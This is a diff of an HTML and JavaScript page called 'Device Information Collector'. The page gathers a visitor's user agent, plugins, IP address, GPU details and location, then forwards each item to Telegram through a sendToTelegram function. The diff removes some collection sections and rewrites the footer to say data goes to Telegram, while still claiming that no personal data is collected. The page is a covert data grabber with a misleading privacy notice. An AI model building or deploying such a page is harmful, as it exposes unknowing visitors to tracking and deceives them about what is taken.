@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Device Information Collector</title>
+    <title>Device Information Collector</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -327,8 +327,8 @@
 <body>
     <div class="container">
         <header>
-            <h1><i class="fas fa-laptop-code"></i> Enhanced Device Information Collector</h1>
-            <p class="subtitle">Comprehensive system analysis with real-time reporting</p>
+            <h1><i class="fas fa-laptop-code"></i> Device Information Collector</h1>
+            <p class="subtitle">Collecting comprehensive device information for security analysis</p>
         </header>
         
         <div class="status-container">
@@ -368,16 +368,6 @@
                     <div class="status-value pending" id="gpu-status">Collecting...</div>
                 </div>
                 <div class="status-item">
-                    <div class="status-icon">🔄</div>
-                    <div class="status-text">Connection & API</div>
-                    <div class="status-value pending" id="connection-status">Collecting...</div>
-                </div>
-                <div class="status-item">
-                    <div class="status-icon">🛡️</div>
-                    <div class="status-text">Security & Privacy</div>
-                    <div class="status-value pending" id="security-status">Collecting...</div>
-                </div>
-                <div class="status-item">
                     <div class="status-icon">📡</div>
                     <div class="status-text">Telegram API</div>
                     <div class="status-value pending" id="telegram-status">Waiting...</div>
@@ -388,7 +378,7 @@
         <div class="system-info">
             <div class="system-item">
                 <div>Data Points Collected</div>
-                <div class="system-value" id="data-points">0 / 18</div>
+                <div class="system-value" id="data-points">0 / 12</div>
             </div>
             <div class="system-item">
                 <div>Collection Time</div>
@@ -408,8 +398,8 @@
     </div>
     
     <div class="footer">
-        <p>This tool collects device information for security analysis purposes. No personal data (passwords, accounts, etc.) is collected.</p>
-        <p>All information is processed in real-time and not stored on any servers.</p>
+        <p>This tool collects device information for security analysis purposes. No personal data is collected.</p>
+        <p>All information is processed in real-time and sent securely to Telegram.</p>
     </div>
 
     <script>
@@ -432,8 +422,6 @@
         const batteryStatus = document.getElementById('battery-status');
         const networkStatus = document.getElementById('network-status');
         const gpuStatus = document.getElementById('gpu-status');
-        const connectionStatus = document.getElementById('connection-status');
-        const securityStatus = document.getElementById('security-status');
         const telegramStatus = document.getElementById('telegram-status');
         
         // Collected data object
@@ -463,7 +451,7 @@
             downlink: 'N/A',
             rtt: 'N/A',
             collected: 0,
-            total: 18
+            total: 12
         };
         
         // Start time for collection
@@ -562,25 +550,6 @@
                     title: 'GPU Information', 
                     content: collectedData.webglVendor ? `${collectedData.webglVendor}, ${collectedData.webglRenderer}` : 'N/A',
                     icon: 'fas fa-gamepad'
-                },
-                { 
-                    title: 'Connection Details', 
-                    content: collectedData.connectionType ? `
-                        Type: ${collectedData.connectionType}<br>
-                        Effective: ${collectedData.effectiveType}<br>
-                        Downlink: ${collectedData.downlink} Mbps<br>
-                        RTT: ${collectedData.rtt} ms
-                    ` : 'N/A',
-                    icon: 'fas fa-signal'
-                },
-                { 
-                    title: 'Security & Privacy', 
-                    content: `
-                        Cookies: ${collectedData.cookies}<br>
-                        Do Not Track: ${collectedData.doNotTrack}<br>
-                        Touch Support: ${collectedData.touchSupport}
-                    `,
-                    icon: 'fas fa-shield-alt'
                 }
             ];
             
@@ -589,7 +558,7 @@
             });
         }
         
-        // Function to send data to Telegram immediately
+        // Function to send data to Telegram
         async function sendToTelegram(dataType, value) {
             try {
                 telegramStatus.textContent = 'Sending...';
@@ -623,7 +592,7 @@
             }
         }
 
-        // Collect Device Name
+        // Collect Device Info
         async function collectDeviceInfo() {
             collectedData.deviceName = navigator.userAgent;
             
@@ -995,26 +964,10 @@
             collectedData.collected++;
             updateProgress();
         }
-        
-        // Collect Connection Info
-        async function collectConnectionInfo() {
-            connectionStatus.textContent = 'Collected';
-            connectionStatus.className = 'status-value success';
-            collectedData.collected++;
-            updateProgress();
-        }
-        
-        // Collect Security Info
-        async function collectSecurityInfo() {
-            securityStatus.textContent = 'Collected';
-            securityStatus.className = 'status-value success';
-            collectedData.collected++;
-            updateProgress();
-        }
 
         // Main function to collect all data
         async function collectAllData() {
-            // Run all collection functions without waiting for location
+            // Run all collection functions
             await collectDeviceInfo();
             collectLocation(); // Non-blocking call
             await collectPlugins();
@@ -1025,8 +978,6 @@
             await collectIPAddress();
             await collectDeviceCapabilities();
             await collectGPUInfo();
-            await collectConnectionInfo();
-            await collectSecurityInfo();
             
             // Final message when all done
             await sendToTelegram('Collection Complete', 'All device information has been collected successfully');
